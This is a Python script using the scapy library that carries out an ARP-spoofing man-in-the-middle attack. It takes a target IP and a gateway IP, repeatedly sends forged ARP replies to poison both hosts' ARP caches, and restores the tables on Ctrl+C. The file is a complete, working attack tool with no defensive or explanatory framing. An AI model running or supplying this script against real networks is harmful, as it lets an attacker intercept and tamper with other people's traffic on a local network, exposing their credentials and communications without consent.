#! /usr/bin/env python
import time
import scapy.all as scapy
import sys
import optparse

def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-t","--target",dest="target_ip",help="IP address of target machine")
    parser.add_option("-g","--gateway",dest="gateway_ip",help="IP addrress of gateway/router")
    values,argumeents = parser.parse_args()
    if not values.target_ip:
        parser.error("Please specify target IP, use --help for more info")
    elif not values.gateway_ip:
        parser.error("Please specify gateway/router IP, use --help for more info")
    return values

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    request = broadcast/arp_request
    answered = scapy.srp(request, timeout=1, verbose=False)[0]
    return answered[0][1].hwsrc

def arp_spoof(target_ip,source_ip):
    target_mac=get_mac(target_ip)
    packet = scapy.ARP(pdst=target_ip, hwdst = target_mac, op = 2, psrc = source_ip)
    scapy.send(packet, verbose=False)

def arp_restore(destination_ip,source_ip):
    destination_mac=get_mac(destination_ip)
    source_mac=get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)

values = get_arguments()
target_ip = values.target_ip
gateway_ip = values.gateway_ip

packets_sent = 0
try:
    while True:
        arp_spoof(target_ip,gateway_ip)
        arp_spoof(gateway_ip,target_ip)
        packets_sent+=2
        print("\r[+]Packets Sent " + str(packets_sent)),
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("Detected Ctrl+C...Restoring ARP Tables")
    arp_restore(target_ip,gateway_ip)
    arp_restore(gateway_ip,target_ip)
